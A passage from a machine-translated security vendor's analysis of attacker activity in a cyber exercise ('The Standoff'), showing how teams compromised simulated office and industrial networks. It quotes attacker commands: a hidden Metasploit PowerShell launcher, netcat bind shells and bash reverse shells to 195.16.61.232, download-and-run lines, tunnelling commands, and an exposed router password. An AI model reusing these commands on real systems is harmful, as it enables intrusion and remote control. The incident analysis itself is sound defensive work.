src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  Au nom du nouvel utilisateur, cr√©e quelques services qui ex√©cutent un certain script PowerShell: <br><br><pre> <code class="hljs powershell">%COMSPEC% /b /c start /b /min powershell.exe <span class="hljs-literal"><span class="hljs-literal">-nop</span></span> <span class="hljs-literal"><span class="hljs-literal">-w</span></span> <span class="hljs-keyword"><span class="hljs-keyword">hidden</span></span> <span class="hljs-literal"><span class="hljs-literal">-noni</span></span> <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([<span class="hljs-built_in"><span class="hljs-built_in">Int</span></span><span class="hljs-type"><span class="hljs-type">Ptr</span></span>]::Size <span class="hljs-operator"><span class="hljs-operator">-eq</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>){<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-variable"><span class="hljs-variable">$env:windir</span></span>+<span class="hljs-string"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};<span class="hljs-variable"><span class="hljs-variable">$s</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">New-Object</span></span> System.Diagnostics.ProcessStartInfo;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.FileName=<span class="hljs-variable"><span class="hljs-variable">$b</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.UseShellExecute=<span class="hljs-variable"><span class="hljs-variable">$false</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.RedirectStandardOutput=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.CreateNoWindow=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$p</span></span>=[<span class="hljs-type"><span class="hljs-type">System.Diagnostics.Process</span></span>]::Start(<span class="hljs-variable"><span class="hljs-variable">$s</span></span>);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  Ce script a √©t√© g√©n√©r√© par le framework Metasploit.  Son but est d'ouvrir le socket sur le port 55443 pour l'√©coute et d'ex√©cuter la ¬´charge utile¬ª qui est venue √† ce port - vraisemblablement Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  Une tentative de lancement d'un shell distant a r√©ussi.  Apr√®s cela, les attaquants ont continu√© √† d√©velopper l'attaque et le nom d'utilisateur cr√©e un autre compte avec le nom "vitalik", en ajoutant ce compte au groupe "Admins du domaine" et peu de temps apr√®s sa cr√©ation, nous voyons une connexion interactive. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  Alors que vitalik a cr√©√© le service avec le m√™me script PowerShell que le nom d'utilisateur, le nom d'utilisateur a r√©initialis√© massivement les mots de passe des comptes de domaine et s'est int√©ress√© au serveur de messagerie de domaine Win2008R2-EXCH voisin. <br><br>  L'activit√© presque simultan√©e des utilisateurs de nom d'utilisateur et de vitalik sur le serveur de domaine Exchange (analyse et connexion) sugg√®re que plusieurs membres de l'√©quipe ont probablement examin√© le r√©seau SPUTNIK en m√™me temps. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  vitalik v√©rifie la disponibilit√© du serveur de messagerie et lance la console de gestion du serveur apr√®s une connexion interactive. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  Ne trouvant rien de valable, il fait glisser son instrumentation et son artillerie lourde sur l'h√¥te Win2008R2-DC - de nombreux scripts PowerShell et le framework BloodHound apparaissent sur le contr√¥leur de domaine, qui est un outil populaire de reconnaissance dans les r√©seaux Active Directory.  Pour acc√©der √† l'interface Web BloodHound, le participant a d√ª d√©sactiver le mode prot√©g√© dans IE, qui a √©galement √©t√© d√©tect√© par le SIEM. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  L'activit√© BloodHound sur le r√©seau n'est pas pass√©e par PT NAD.  L'une des fonctionnalit√©s de l'outil √©tait de rechercher des connexions actives sur les h√¥tes du r√©seau.  Un tel trafic vers le service SRVSVC est d√©tect√© par l'une des signatures PT NAD et indique une intelligence √† l'int√©rieur du r√©seau: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  Vers une heure du matin, les attaquants, apr√®s avoir cr√©√© un clich√© instantan√© du disque √† l'aide de l'utilitaire vssadmin, ont fait glisser la base de donn√©es ntds.dit contenant tous les comptes de domaine.  Apr√®s avoir r√©ussi cette attaque, les attaquants prennent compl√®tement le contr√¥le du domaine, recevant le hachage du compte sp√©cial ¬´krbtgt¬ª √† leur disposition.  Poss√©der ce compte vous permet de cr√©er et d'utiliser ce que l'on appelle.  Golden Ticket - Ticket Kerberos pour un acc√®s illimit√© aux ressources du domaine, l'acc√®s aux serveurs au nom de tout utilisateur existant et m√™me inexistant et toutes les actions du domaine.  L'utilisation de Golden Ticket est assez difficile √† d√©tecter √† l'aide d'un √©quipement de protection, mais compromettre les liens krbtgt et ntds.dit est beaucoup plus facile √† d√©tecter. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  L'√©quipe passe progressivement de la recherche de domaine √† la recherche du r√©seau de syst√®me de contr√¥le de processus automatis√© qu'elle a ouvert.  Apr√®s avoir d√©plac√© les scanners Nmap vers les employ√©s de SPUTNIK - YLAVRENTIEV.sputnik.phd et EPONOMAREV.sputnik.phd, les r√©seaux ont √©t√© scann√©s 172.20.xx. Les participants ont utilis√© <a href="">nmap_performance.reg</a> pour modifier les param√®tres TCP / IP de la pile Windows et acc√©l√©rer l'analyse du r√©seau de contr√¥le des processus. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  Les connexions aux h√¥tes dans le syst√®me de contr√¥le automatique des processus du r√©seau via les tunnels sur les h√¥tes du domaine SPUTNIK parlent d'elles-m√™mes.  Une description de ce que les pirates ont fait sur le r√©seau industriel peut √™tre trouv√©e dans la vid√©o de nos coll√®gues sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">YouTube</a> . <br><br>  Parmi les autres r√©alisations des attaquants, d'autres tunnels, des sessions ssh, des perc√©es cr√©atives apr√®s une nuit blanche le premier jour de la comp√©tition, et bien s√ªr, des mineurs de jeu √©tablis qui exploitaient la monnaie DDOS Coin ont √©galement √©t√© remarqu√©s. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  Situ√© dans le bureau n ¬∞ 1 de la DMZ et a fi√®rement jou√© son r√¥le jusqu'√† environ midi, il a √©t√© pirat√© par une √©quipe non identifi√©e. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  Il n'a pas √©t√© difficile de trouver les informations d'identification d'administrateur et l'√©quipe a utilis√© la fonctionnalit√© zabbix int√©gr√©e pour √©tendre de mani√®re illimit√©e les capacit√©s de surveillance √† l'aide de scripts personnalis√©s. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  Vous pouvez utiliser n'importe quelle commande Linux dans les scripts, ce que les √©quipes membres ont utilis√© pour cr√©er des proxys shells et Socks. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  L'√©quipe a tent√© de t√©l√©charger le module depuis le serveur sous contr√¥le 195.16.61.232, mais en vain: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Ensuite, apr√®s une petite exploration de l'environnement, j'ai install√© un shell bash distant en utilisant des outils linux standard avec le m√™me serveur, en envoyant des paquets directement √† / dev / tcp /. <br><br>  Non moins int√©ressant √©tait le contenu du trafic entre l'√©quipe et les obus, qui √©tait transmis en clair et ne passait pas par les capteurs PT NAD. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  Comme nous pouvons le voir, le serveur ZABBIX a √©t√© principalement utilis√© comme t√™te de pont pour la reconnaissance des sous-r√©seaux de bureau # 1: 10.100.50.0/24 (utilisateurs), 10.100.60.0/24 (serveurs) et 10.100.80.0/24 (SecurityTeam). <br><br><h2>  Multiserveur (100.64.100.167) </h2><br>  Multiserver est un autre h√¥te Linux dans le bureau DMZ # 1 avec une paire de serveurs HTTP et une base de donn√©es MySQL √† bord.  Bien que le multiserveur ait √©t√© soumis √† une analyse intensive, il n'y a eu que quelques attaques r√©ussies.  L'h√¥te contenait la vuln√©rabilit√© SambaCry 2017, trouv√©e apr√®s les vuln√©rabilit√©s MS17-010, et les √©quipes ont essay√© de l'utiliser.  Le filtre PT NAD vous permet de localiser leurs tentatives sur la timeline: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  La charge dans l'une des tentatives de la commande # 3 √©tait la biblioth√®que ex√©cutable DTECJtAf.so.  Et, √† en juger par le nom de la biblioth√®que, les membres de l'√©quipe ont utilis√© le module is_known_pipename du Metasploit Framework.  Preuve: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  Lors de la confrontation, les experts ont √©t√© assist√©s par PT MultiScanner, qui a v√©rifi√© tous les fichiers survolant le r√©seau qui ont √©t√© remarqu√©s par PT NAD.  Apr√®s quelques instants, il rend un verdict √† DTECJtAf.so survolant le r√©seau: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  A en juger par l'absence d'autres interactions r√©seau entre le serveur et la commande n ¬∞ 3, l'exploit n'a pas port√© ses fruits.  Cependant, presque en m√™me temps, nous voyons une session SSH active de l'√©quipe # 4.  Par le volume de trafic transmis, nous pouvons juger que les attaquants ont utilis√© le serveur au maximum. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  De mani√®re g√©n√©rale, la premi√®re connexion SSH r√©ussie de l'utilisateur administrateur de l'√©quipe n ¬∞ 4 s'est produite vers 15 h 20 le 1er jour de la comp√©tition: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Comme tout attaquant d√©cent, la connexion est suivie d'une v√©rification des privil√®ges et d'une reconnaissance sur l'h√¥te: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  Et au-del√†: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  Avec facilit√©, nous effectuons l'attribution de l'attaquant par langue: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  Le multiserveur n'a pas re√ßu la configuration appropri√©e et on ne sait pas avec certitude quelles autres tentatives les √©quipes ont faites.  √Ä en juger par les journaux disponibles, cet h√¥te, ainsi que d'autres h√¥tes du bureau DMZ # 1, ont servi de point de d√©part pour explorer l'infrastructure interne du bureau. <br><br><h2>  Mis </h2><br>  D'autres h√¥tes sont √©galement devenus le centre d'attention des √©quipes.  Par exemple, les participants se sont comport√©s avec curiosit√© par rapport au routeur Mikrotik au 100.64.100.237 dans le r√©seau DMZ d'Office # 1.  Vers 2 heures du matin le deuxi√®me jour de la confrontation, une connexion r√©ussie √† la console de la console du routeur Telnet avec la paire ¬´admin: VxPvRxX74e8xrbia77hsi7WKm¬ª a r√©ussi.  La version du firmware de l'appareil √©tait la 6.38.4 - c'est la version sur laquelle le c√©l√®bre exploit Chimay Red Stack Clash pour Mikrotik a √©t√© test√©, qui permettait d'ex√©cuter n'importe quel code sur l'appareil, et, en particulier, d'extraire les mots de passe des utilisateurs sur le routeur.  PT NAD a d√©couvert une vuln√©rabilit√© d'exploitation. <br><br>  Mais ensuite, dans la zone du d√©jeuner, l'√©quipe qui a d'abord pris le routeur a d√©cid√© de fermer le trou avec une simple mise √† jour du firmware et de monopoliser l'acc√®s: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  C'est l'un des rares exemples o√π une √©quipe de participants ferme un trou dans le syst√®me afin que d'autres √©quipes ne puissent pas capturer cet h√¥te. <br><br>  PT MultiScanner a d√©tect√© un √©v√©nement curieux: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  Pour acc√©der √† la banque, les √©quipes pouvaient utiliser le client bancaire disponible sur le site.  Le site est situ√© dans le r√©seau bancaire sous la supervision d'une √©quipe de d√©fenseurs et ils ont <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">construit le</a> client en utilisant le framework Metasploit et l'ont remplac√© par celui d'origine.  Heureusement pour les d√©fenseurs, le client int√©gr√© a √©t√© t√©l√©charg√© par plusieurs √©quipes, comme nous le voyons dans la capture d'√©cran de PT MultiScanner ci-dessus.  Aucune connexion r√©ussie n'a √©t√© remarqu√©e, mais le cas m√©rite d'√™tre mentionn√©, car de tels sc√©narios se produisent dans la vie ordinaire - des attaquants programmes de chevaux de Troie sur des sites Web officiels ou remplacent des mises √† jour pour lancer des attaques sur des clients. <br><br><h2>  Mineurs </h2><br>  Une autre innovation dans The Standoff a √©t√© l'av√®nement des mineurs de jeux.  Selon la l√©gende, les √©quipes pourraient utiliser les serveurs captur√©s comme mineurs, ce qui leur apportait des points suppl√©mentaires.  Au lieu des crypto-monnaies traditionnelles, ils ont exploit√© DDoS Coin - l'√©quivalent en devise de l'effort consacr√© √† une attaque DDoS sur un serveur.  Les donn√©es des poign√©es de main TLS 1.2 ont servi de preuve de travail et plus le mineur a fait de poign√©es de main TLS avec le serveur cible, plus sa probabilit√© de trouver un nouveau bloc et de recevoir sa r√©compense de l'organisateur de l'attaque DDoS √©tait √©lev√©e. <br><br>  Le client √©tait √©crit en Go et pouvait fonctionner √† la fois sur Windows et Linux.  L'id√©e a √©t√© appliqu√©e pour la premi√®re fois et, bien que toutes les √©quipes n'aient pas r√©ussi √† l'appliquer, des tentatives de lancement ont √©t√© observ√©es sur de nombreux serveurs de l'infrastructure de jeu: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Tentative d'ex√©cution du mineur sur le n≈ìud Joomla (100.64.154.147) <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Ex√©cution du mineur √† partir de l'infrastructure SPUTNIK (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  Dans le cadre du jeu, les √©quipes pourraient extraire la crypto-monnaie et l'√©changer contre des points de jeu.  La moiti√© des √©quipes ont r√©ussi √† utiliser les serveurs pr√©c√©demment captur√©s pour extraire les blocs.  Il y avait aussi une composante de change dans la logique du jeu - avec un fort changement dans la quantit√© de devises extraites, son taux de change a diminu√©.  Ainsi, il a √©t√© possible d'effectuer des op√©rations sp√©culatives et de gagner des points sans terminer les t√¢ches de base.  Mais comme cette id√©e n'√©tait pas appliqu√©e auparavant dans de tels jeux, les √©quipes n'ont pas pu l'utiliser correctement et cela n'a pas affect√© de mani√®re significative le d√©roulement du jeu. <br><br>  En termes de nombre de blocs extraits, l'√©quipe kazakhe CARKA a pris les devants, qui a √©t√© la premi√®re √† lancer des mineurs sur l'infrastructure de jeu.  Ici, nous avons pu nous √©loigner des num√©ros de r√©seau des √©quipes pour leurs noms, car leurs identifiants contenaient des informations sur le bloc et ont √©t√© pris en compte lors du calcul.  En g√©n√©ral, l'id√©e s'est av√©r√©e bonne, et c'est s√ªr qu'elle peut √™tre vue au prochain The Standoff. <br><br><h2>  Au lieu de la sortie </h2><br>  Last Standoff √©tait chaud - 12 √©quipes ont activement explor√© et pirat√© l'infrastructure de la ville.  Nos produits nous ont permis ¬´d'espionner¬ª exactement comment les participants au jeu ont agi, quelles tactiques et quels outils ils ont choisis et ce qui est devenu leur objectif.  Nous avons vu comment ils interagissaient avec l'infrastructure de domaine du bureau, en commen√ßant par l'infection d'une machine et se terminant par la saisie de l'ensemble du domaine et la transition vers le prochain r√©seau ACS.  Lors d'un √©v√©nement comme The Standoff, les produits ont une √©norme charge: MaxPatrol SIEM a fait face √† 20000 EPS et PT NAD a trait√© plus de 3 t√©raoctets de trafic r√©seau au cours des deux jours, sans parler de l'infrastructure r√©seau elle-m√™me: routeurs, commutateurs et pare-feu. <br><br>  Un tel compromis des bureaux virtuels pourrait se produire avec de vrais bureaux sans les moyens appropri√©s de protection et de contr√¥le.  En r√®gle g√©n√©rale, cela entra√Æne la fuite de donn√©es pr√©cieuses telles que la correspondance, les donn√©es financi√®res et les donn√©es personnelles des employ√©s / utilisateurs. <br><br>  Parmi les analyses, les brutes et les tentatives d'exploiter toutes sortes de vuln√©rabilit√©s, les produits ont aid√© √† d√©terminer comment les serveurs d'infrastructure de jeu √©taient pirat√©s.  Les attaques r√©ussies et les traces de compromis r√©ussies telles que les shells Web, les consoles distantes, les tunnels et les connexions h√¥tes ont √©t√© d√©termin√©es.  Tout cela aide les experts √† am√©liorer les produits. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  Dans cette capture d'√©cran des statistiques sur les connexions VPN des √©quipes pendant le jeu, vous pouvez voir √† quel point The Standoff √©tait international: les connexions VPN ont √©t√© √©tablies avec des serveurs aux √âtats-Unis, au Kazakhstan, aux Pays-Bas et dans la moiti√© de l'Europe!  Soit dit en passant, il n'y avait aucune √©quipe des √âtats-Unis ou d'Europe √† The Standoff, mais il y avait une √©quipe du Kazakhstan. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr418335/">https://habr.com/ru/post/fr418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr418323/index.html">Un peu sur les attributs des h√¥tes, clavier, code et SCS dans la s√©rie "World of the Wild West" (Westworld)</a></li>
<li><a href="../fr418327/index.html">Cordonniers avec des bottes: quels smartphones les experts choisissent-ils pour eux-m√™mes</a></li>
<li><a href="../fr418329/index.html">Organisation de tests s√ªrs en production. 2e partie</a></li>
<li><a href="../fr418331/index.html">Ma√Ætres des serveurs et des r√©seaux - joyeuses f√™tes</a></li>
<li><a href="../fr418333/index.html">Les robots Uber reprennent la route, mais les gens les conduiront</a></li>
<li><a href="../fr418337/index.html">Hot DataGrip d'√©t√© 2018.2</a></li>
<li><a href="../fr418341/index.html">Bonne journ√©e de l'administrateur syst√®me! Carte de voeux avec sens</a></li>
<li><a href="../fr418345/index.html">Documentation des formats d'√©change d'informations - facile et simple</a></li>
<li><a href="../fr418347/index.html">Comment ai-je √©crit la biblioth√®que C ++ 11 standard ou pourquoi boost est si effrayant. Chapitre 4.3</a></li>
<li><a href="../fr418349/index.html">Azure Kubernetes Service (AKS) et PowerShell</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>